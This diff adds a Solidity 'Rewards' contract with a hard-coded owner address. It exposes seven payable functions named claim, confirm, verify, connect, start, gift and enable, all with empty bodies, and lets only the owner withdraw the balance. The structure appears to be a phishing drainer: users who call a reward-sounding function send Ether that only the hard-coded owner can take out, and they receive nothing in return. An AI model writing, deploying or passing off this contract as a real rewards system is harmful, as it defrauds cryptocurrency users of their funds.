@@ -1,0 +1,59 @@
+contract Rewards is Ownable {
+    event Withdrawal(address indexed recipient, uint256 amount);
+
+    constructor() {
+        // Define o proprietário do contrato no momento da implantação
+        transferOwnership(0xfdE93960DEfcc3968e5c0b663cA237272d9F81aF);
+    }
+
+    receive() external payable {
+        // Implementar lógica para lidar com Ether recebido diretamente pelo contrato
+    }
+
+    function withdraw(uint256 amount, address payable recipient) external onlyOwner {
+        require(amount > 0, "Amount must be greater than zero");
+        require(amount <= address(this).balance, "Requested amount exceeds the contract balance.");
+        require(recipient != address(0), "Recipient address cannot be the zero address.");
+
+        // Realiza a transferência do valor para o destinatário
+        recipient.transfer(amount);
+        emit Withdrawal(recipient, amount);
+    }
+
+    function claim() public payable {
+        // Implementar lógica para recompensas de claim
+    }
+
+    function confirm() public payable {
+        // Implementar lógica para recompensas de confirm
+    }
+
+    function verify() public payable {
+        // Implementar lógica para recompensas de verify
+    }
+
+    function connect() public payable {
+        // Implementar lógica para recompensas de connect
+    }
+
+    function start() public payable {
+        // Implementar lógica para recompensas de start
+    }
+
+    function gift() public payable {
+        // Implementar lógica para recompensas de gift
+    }
+
+    function enable() public payable {
+        // Implementar lógica para recompensas de enable
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+
+    function setNewOwner(address newOwner) public onlyOwner {
+        require(newOwner != address(0), "New owner address cannot be the zero address.");
+        transferOwnership(newOwner);
+    }
+}
